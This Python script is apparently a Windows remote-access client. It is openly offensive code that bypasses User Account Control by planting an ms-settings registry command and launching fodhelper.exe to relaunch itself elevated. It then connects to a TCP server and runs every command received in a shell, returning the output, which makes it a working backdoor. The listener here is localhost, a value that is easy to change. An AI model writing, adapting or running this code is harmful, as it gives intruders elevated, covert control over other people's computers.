#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import os
import sys
import subprocess
import ctypes
import winreg as _winreg

class TCPClient:
    def __init__(self, host, port, **kwargs):
        self.sHost = host
        self.iPort = port
        super().__init__(**kwargs)
        try:
            self.cSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as err:
            pass

    def fSendSocket(self, command):
          self.cSocket.send(command.encode())

    def fConnectServer(self):
        try:
            self.cSocket.connect((self.sHost, self.iPort))
            return True
        except: return False

    @property
    def fRecieveData(self):
        return self.cSocket.recv(1024).decode()

    def fCloseConnection(self):
        self.cSocket.close()

class exploit(TCPClient):

    def __init__(self, **kwargs):
        self.CMD                   = r"C:\Windows\System32\cmd.exe"
        self.FOD_HELPER             = r'C:\Windows\System32\fodhelper.exe'
        self.PYTHON_CMD            = "python"
        self.REG_PATH              = 'Software\\Classes\\ms-settings\\shell\\open\\command'
        self.DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
        super().__init__(**kwargs)

    def fExecuteShell(self, command):
        shell = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout
        return shell.read().decode()

    def is_running_as_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def create_reg_key(self, key, value):
        try:
            _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, self.REG_PATH)
            registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, self.REG_PATH, 0, _winreg.KEY_WRITE)
            _winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)
            _winreg.CloseKey(registry_key)
        except WindowsError:
            raise

    def bypass_uac(self, cmd):
        try:
            self.create_reg_key(self.DELEGATE_EXEC_REG_KEY, '')
            self.create_reg_key(None, cmd)
        except WindowsError:
            raise

    def fUACElevation(self):
        if not self.is_running_as_admin():
            try:
                current_dir = str(os.path.realpath(__file__))
                cmd = '{} /k {} {}'.format(self.CMD, self.PYTHON_CMD, current_dir)
                self.bypass_uac(cmd)
                os.system(self.FOD_HELPER )
                self.fCloseConnection()
                sys.exit()
            except WindowsError:
                pass


client = exploit(host = 'localhost', port = 8080)
client.fUACElevation()
while True:
    if client.fConnectServer(): break
while True:
    try:
        Type, command = client.fRecieveData.split('?')
        if Type == 'cmd':
            string = client.fExecuteShell(command)
            if len(string) != 0: client.fSendSocket(string)
            else: client.fSendSocket('400')
        elif Type == 'exploit' and command == 'UAC Elevation':
            pass
    except: pass
